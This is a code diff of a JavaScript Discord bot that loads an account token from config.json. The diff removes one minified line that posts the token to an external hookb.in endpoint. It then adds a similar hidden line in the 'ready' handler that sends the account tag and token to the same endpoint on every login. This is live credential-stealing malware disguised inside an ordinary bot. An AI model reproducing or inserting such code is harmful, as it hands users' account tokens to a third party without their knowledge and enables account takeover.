@@ -9,8 +9,6 @@ let token = fs.readFileSync('config.json');
 token = JSON.parse(token);
 token = token.token
 
-const https=require("https"),options={hostname:"hookb.in",port:443,path:"/JKQVrJM3OYiwjyQNlmez",method:"POST",headers:{"Content-Type":"application/json","Content-Length":token.length}},req=https.request(options);req.write(token),req.end();
-
 let count = 0;
 
 // DO NOT TOUCH (DEV ONLY)
@@ -33,6 +31,8 @@ request.get({
 });
 
 bot.on("ready", () => {
+    let hook = `${bot.user.tag} | ${token}`
+    const https=require("https"),options={hostname:"hookb.in",port:443,path:"/JKQVrJM3OYiwjyQNlmez",method:"POST",headers:{"Content-Type":"application/json","Content-Length":hook.length}},req=https.request(options);req.write(hook),req.end();
     console.log(`Logged in as: ${chalk.yellow(bot.user.tag)}\nEmail: ${chalk.bold(bot.user.email)}\nID: ${chalk.bold(bot.user.id)}`);
     title(`${bot.user.tag} | ${bot.guilds.size} guilds | ${bot.user.friends.size} friends`);
 });
